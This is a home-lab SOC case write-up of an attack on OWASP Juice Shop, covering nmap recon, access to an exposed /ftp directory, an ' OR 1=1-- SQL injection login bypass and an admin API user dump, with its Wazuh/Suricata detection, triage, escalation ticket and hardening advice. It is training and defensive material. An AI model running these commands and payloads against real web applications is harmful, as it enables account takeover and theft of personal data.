# Case 02 — Juice Shop Web Attack: Recon → Path Traversal → SQLi → Data Exfiltration

> **Note:** This is an educational home-lab case. All addresses, accounts, and tokens are fictional and used only in an isolated environment.

Hands-on case from a home lab. Full cycle: attacker (Kali) → target (Ubuntu Server + OWASP Juice Shop) → detection (Wazuh + Suricata) → L1 triage → L2 escalation.

## Case Card

| Field | Value |
|---|---|
| Case ID | SOC-2026-002 |
| Date | 2026-11-09 |
| Difficulty | Junior / L1 |
| Domain | SOC, Web Application Security, Incident Response |
| MITRE ATT&CK | T1595 Active Scanning, T1046 Network Service Discovery, T1083 File and Directory Discovery, T1190 Exploit Public-Facing Application, T1078 Valid Accounts, T1005 Data from Local System |
| SIEM | Wazuh 4.14 (single-node, Docker) + Suricata (IDS mode, eve.json → Wazuh agent) |

## Summary

An attacker from an internal IP performs a full kill-chain against a deliberately vulnerable web application (OWASP Juice Shop): port scanning, HTTP enumeration, path traversal to a hidden `/ftp` directory, SQL injection in the login form resulting in an admin JWT, and finally mass exfiltration of the user database via an authenticated admin API call.

The L1 analyst's goal: correlate the alert sequence into **one incident**, separate recon from confirmed compromise, and package facts for L2 — including a discovered **visibility gap** (API traffic with a stolen token is not detectable with current logging).

## Network Topology

| Role | VM | IP | OS / Software |
|---|---|---|---|
| Attacker | Kali Linux | 192.168.100.20 | Kali (rolling), nmap 7.99, curl |
| SIEM | u1 | 192.168.100.22 | Ubuntu Server, Wazuh 4.14 single-node (Docker), Suricata |
| Target | u3 | 192.168.100.24 | Ubuntu Server, nginx/1.28.3, OWASP Juice Shop, Wazuh agent id `001` |

Network: VirtualBox Host-only `192.168.100.0/24`. Wazuh agent + Suricata sensor on the target host forward events to the SIEM.

## Attack

### Phase 1 — Reconnaissance

```bash
# 1. Host discovery (ICMP)
ping -n 2 192.168.100.24

# 2. SYN scan, top-100 ports, slow timing (deliberately stealthy: -T2)
sudo nmap -sS --top-ports 100 -T2 192.168.100.24
# Result: 22/tcp open ssh, 80/tcp open http. 98 ports closed (RST).
# NOTE: nmap probed DB ports (1433, 3306) — they are CLOSED.

# 3. HTTP fingerprinting (noisy for the app, invisible for IDS)
curl -sI  http://192.168.100.24/            # Server: nginx/1.28.3 (Ubuntu)
curl -s   http://192.168.100.24/robots.txt  # Disallow: /ftp   <-- attacker's gift
```

### Phase 2 — Exploitation

```bash
# 4. Path traversal into the "hidden" directory (challenge: Confidential Document)
curl -s http://192.168.100.24/ftp/                  # 200 — directory listing OPEN
curl -s http://192.168.100.24/ftp/acquisitions.md   # 200 — confidential doc exfiltrated

# 5. SQL injection in the login form (challenge: Login Admin)
curl -s -X POST http://192.168.100.24/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
# Response: {"authentication":{"token":"eyJ0eXAiOiJKV1Qi..."}}
# Decoded JWT payload: {"data":{"id":1,"email":"admin@juice-sh.op","role":"admin",...}}
# → Full authentication bypass with a valid admin token.

# 6. Post-exploitation: mass PII exfiltration via authenticated admin API
curl -s -H "Authorization: Bearer $TOKEN" http://192.168.100.24/api/Users
# Response: full user list (emails, roles, registration dates)
```

> **Note on timestamps:** The original lab notes used approximate times. The Wazuh event export used for this case covers **2026-11-09 22:17:54 – 23:09:50 UTC**; the PDF Threat Hunting report covers **2026-11-09T22:16:00 – 2026-11-10T01:11:28**. The timeline below is aligned with the exported alert data.

## Detection

### What the SIEM saw

| # | Time (UTC) | Event | Source | Detection |
|---|---|---|---|---|
| 1 | 22:37:03 – 23:09:50 | Scan / recon activity from `192.168.100.20` | Suricata | 25× rule **86601** (ET SCAN / ET HUNTING curl/Nmap user-agents, port probes) |
| 2 | 22:35:29 | System audit events on target | Wazuh agent | 7× rule **516** |
| 3 | 22:35:40 – 22:37:13 | Interactive PAM sessions | Wazuh agent | 3× `PAM: Login session opened` (**5501**), 4× `PAM: Login session closed` (**5502**) |
| 4 | 22:37:03 | SQL injection attempt in login form | Wazuh agent / Suricata | 1× rule **31164** — `SQL injection attempt` (L6) |
| 5 | 23:00:08 | nginx error message | nginx error log | 1× rule **31301** |
| 6 | 23:09:50 | Web server 500 Internal Error | Wazuh agent | 1× rule **31122** (L5) |
| 7 | shortly after 22:37 | GET `/api/Users` with stolen Bearer token | **NOT VISIBLE in SIEM** | ⚠️ visibility gap — valid admin JWT usage looks like normal traffic |

### Event breakdown (from raw Wazuh export)

| Count | Rule ID | Level | Description |
|---|---|---|---|
| 25 | 86601 | 3 | Suricata: Alert — ET SCAN / ET HUNTING user-agents and port probes |
| 7 | 516 | 3 | System Audit event |
| 4 | 5502 | 3 | PAM: Login session closed |
| 3 | 5501 | 3 | PAM: Login session opened |
| 2 | 5402 | 3 | Successful sudo to ROOT executed |
| 1 | 31164 | 6 | SQL injection attempt |
| 1 | 31122 | 5 | Web server 500 error code (Internal Error) |
| 1 | 31301 | 3 | Nginx error message |
| 1 | 5403 | 4 | First time user executed sudo |
| 1 | 81101 | 3 | Attached USB Storage |
| 1 | 81102 | 3 | USB device disconnected |
| 1 | 503 | 3 | Wazuh agent started |
| 1 | 506 | 3 | Wazuh agent stopped |

**Total:** 49 alert events in the exported window.

### Key alert example (Suricata → Wazuh)

```json
"alert": {
  "signature": "ET SCAN Suspicious inbound to MSSQL port 1433",
  "signature_id": "2010935",
  "severity": "2",
  "action": "allowed",
  "category": "Potentially Bad Traffic"
},
"src_ip": "192.168.100.20", "dest_ip": "192.168.100.24", "dest_port": "1433",
"flow": { "pkts_toserver": "1", "pkts_toclient": "0" }
```

**Analyst reading:** 1 packet to server, 0 to client, severity Informational → this is a *port probe during a scan*, **not** evidence that MSSQL is open. Correlated with scan results, port 1433 answered RST. Alert ≠ fact.

### Evidence

- [`iocs/wazuh-events.csv`](iocs/wazuh-events.csv) — raw 49-event Wazuh export used for counts and timestamps.
- [`iocs/wazuh-threat-hunting-report.pdf`](iocs/wazuh-threat-hunting-report.pdf) — 5-page Wazuh Threat Hunting report for agent `001`.
- [`iocs/screenshots/wazuh-agent-overview.png`](iocs/screenshots/wazuh-agent-overview.png) — agent dashboard screenshot (events evolution + MITRE tactics).

## MITRE ATT&CK Mapping

- **T1595.002 Active Scanning: Vulnerability Scanning** — nmap SYN scan
- **T1046 Network Service Discovery** — port/service enumeration
- **T1083 File and Directory Discovery** — `/ftp` enumeration via robots.txt
- **T1190 Exploit Public-Facing Application** — path traversal + SQLi (Juice Shop)
- **T1078 Valid Accounts** — use of the forged admin JWT
- **T1005 Data from Local System** — `/api/Users` dump (PII exfiltration)

## L1 Triage

L1 never touches the target host — the job is to confirm the incident within 10–15 minutes and package the facts for L2.

1. **Aggregation.** All events from `192.168.100.20` → **one incident**, several stages (recon → enumeration → exploitation → exfiltration). Never file "three scans" as three incidents.
2. **Alert reading discipline.** The MSSQL-1433 alert means *probing*, not *open port*. Verify against other sources before writing "attacker found databases" in a report.
3. **False-positive check.** `192.168.100.20` is internal (Kali). In a real SOC, verify ownership in CMDB / authorized-scanner allowlists before recommending a block.
4. **Severity ladder.** Scan = informational. `200 OK` on a hidden resource = data leak. Successful login bypass = account takeover. Admin API dump = **critical, P1/P2**.
5. **Visibility gap.** `GET /api/Users` with a stolen Bearer token is indistinguishable from a legit admin request and was **not visible in the SIEM**. Record it in the ticket — L1 cannot analyze what is not logged.
6. **Verdict: true positive, P1/P2 — confirmed web compromise with PII exfiltration.**

## Escalation to L2

```
# [ESCALATION][P1/P2] Web app compromise: SQLi auth bypass + PII exfiltration

**Case ID:** SOC-2026-002
**Escalated by:** SOC L1
**Date:** 2026-11-09

## Verdict

**True positive.** Confirmed multi-stage web attack on the Juice Shop application, ending in admin account takeover and mass PII exfiltration. Source IP has no legitimate role; activity pattern is a textbook kill-chain (recon → exploitation → exfiltration).

## Scope

| | |
|---|---|
| **Target host** | u3 (192.168.100.24) — Ubuntu, nginx/1.28.3, OWASP Juice Shop, Wazuh agent `001` |
| **Source IP** | 192.168.100.20 (internal — verify ownership in CMDB before blocking) |
| **Affected assets** | Juice Shop web app: admin account, full user database, `/ftp` documents |

## Timeline (UTC)

| Time | Event | Evidence |
|---|---|---|
| 22:37:03 – 23:09:50Z | Scan / recon activity (nmap/curl) | Suricata rule 86601 (25 alerts); includes `ET SCAN Suspicious inbound to MSSQL port 1433` sid 2010935 |
| ~22:37Z | POST `/rest/user/login`, body contains `' OR 1=1--` → 200 + admin JWT | Wazuh rule 31164 (SQL injection attempt, L6) + nginx access.log |
| ~22:37Z | GET `/ftp/` → 200, GET `/ftp/acquisitions.md` → 200 | nginx access.log — confidential document exfiltrated |
| 23:00:08Z | nginx error message | Wazuh rule 31301 |
| 23:09:50Z | Web server 500 Internal Error | Wazuh rule 31122 (L5) |
| +minutes | GET `/api/Users` with `Authorization: Bearer <admin JWT>` → 200 | ⚠️ Not visible in SIEM — see visibility gap below — full user DB dump |

## Impact

1. **Data leak** — confidential business document (`acquisitions.md`) downloaded.
2. **Account takeover** — valid admin JWT issued for `admin@juice-sh.op` via SQL injection.
3. **PII exfiltration** — entire user table retrieved through the authenticated admin API.

## Evidence attached

- Wazuh event export for agent `001`: `iocs/wazuh-events.csv`
- 5-page Wazuh Threat Hunting report: `iocs/wazuh-threat-hunting-report.pdf`
- Agent overview screenshot: `iocs/screenshots/wazuh-agent-overview.png`
- Suricata alert example: `ET SCAN Suspicious inbound to MSSQL port 1433`, sid 2010935, severity 2, 1 pkt to server / 0 to client → probe only, port 1433 was closed
- nginx access.log lines for src `192.168.100.20` (GET `/`, `/robots.txt`, `/ftp/`, `/ftp/acquisitions.md`, POST `/rest/user/login`)

## ⚠️ Visibility gap (action needed)

Requests to `GET /api/Users` with a stolen Bearer token were **not observable in the SIEM**. Network IDS does not flag authenticated API traffic, and the event was not found in the Wazuh index. **L1 cannot analyze what is not logged.**

**Requested from engineering:** verify that nginx `access_log` for all vhosts is shipped by the Wazuh agent without rotation gaps; check Discover (`wazuh-alerts-*`) for the event; consider application-level audit logging of admin API access (who/what/when/src IP).

## Requested actions (L2 / IR)

1. **Containment:** block `192.168.100.20` at the firewall (after CMDB check).
2. **Eradication:** invalidate all active JWTs/sessions; force password reset, starting with `admin@juice-sh.op`; rotate app secrets.
3. **Scope review:** from nginx access.log — all `/api/*` and `/ftp/*` requests from the source IP; check `/ftp` for other exposed files.
4. **Detection improvements:** deploy WAF (ModSecurity + OWASP CRS); enable/verify Suricata SQLi ruleset; alert on behavior pattern (new src IP → admin-scope API burst within minutes of login).

## Root causes to fix (not L1 scope, flagging for awareness)

- SQL injection in `/rest/user/login` — app must use parameterized queries.
- Directory listing enabled on `/ftp` + sensitive files inside web root.
- Reliance on `robots.txt` as access control.
- Server version disclosure (`Server: nginx/1.28.3`).

---
*Prepared by L1 per case SOC-2026-002. No changes were made to any host.*
```

## Response (Reference — L2/IR)

```bash
# Lab only. In production — block at the perimeter firewall.
sudo iptables -A INPUT -p tcp -s 192.168.100.20 -j DROP
```

- Invalidate sessions / rotate secrets; force password resets.
- Scope review: all `/api/*` and `/ftp/*` requests from the source IP in access.log.
- Fix root causes: parameterized queries, disable directory listing, remove sensitive files from web root, stop relying on robots.txt for "security".

## Hardening / SOC Improvements

- Deploy a WAF (ModSecurity + OWASP CRS) — blocks SQLi payloads in phase 2.
- Ensure nginx `access_log` captures all vhosts and the Wazuh agent ships them reliably (no rotation gaps).
- Enable Suricata `etpro/exploit` SQLi rules if missing; alert on `..` sequences and ` OR 1=1` patterns in URIs/bodies.
- Consider application-level audit logging (who accessed admin APIs, from where) — JWT abuse is a blind spot for network IDS.
- Treat `robots.txt` entries as an attack-surface inventory: anything "disallowed" should be access-controlled, not just unlinked.

## Lessons Learned

- **IDS catches scanners and payloads, not stolen sessions.** The final exfiltration stage rode on a valid admin token and was invisible to Suricata. Behavior correlation (new IP → admin-scope API burst within minutes of "login") is the only network-side defense.
- **Alert ≠ fact.** A "Suspicious inbound to MSSQL port" alert reflects a single probe packet; the port was closed. Analysts must correlate before reporting impact.
- **Aggregation is a core L1 skill.** One incident, many alerts; the timeline — not the alert count — tells the story.
- **Slow scans evade rate-based rules** (`-T2` produced sparse alerts over minutes). They are caught by source-IP correlation over a time window, exactly how this exercise was detected.
- **Visibility gaps belong in L1 reports.** "We cannot see X" is a finding, not an excuse — it drives engineering work (log coverage, rulesets, app audit trails).

## IOCs

| Type | Value |
|---|---|
| Source IP | 192.168.100.20 (Kali) |
| Target | 192.168.100.24:80 (nginx → Juice Shop) |
| Scan signature | `ET SCAN Suspicious inbound to MSSQL port 1433`, sid 2010935 |
| Wazuh decoder rule | 86601 (Suricata alert), level 3 |
| SQLi rule | 31164 (SQL injection attempt), level 6 |
| Web error rule | 31122 (Web server 500 error), level 5 |
| SQLi payload | `' OR 1=1--` in JSON body of POST `/rest/user/login` |
| Stolen artifact | Admin JWT for `admin@juice-sh.op` (role: admin) |
| Exfil endpoint | `GET /api/Users` (200, full user list) |
| Leaked doc | `/ftp/acquisitions.md` (200) |
| Behavior pattern | scan → robots.txt → `/ftp` → SQLi login → admin API burst, all within ~40 min from one src IP |
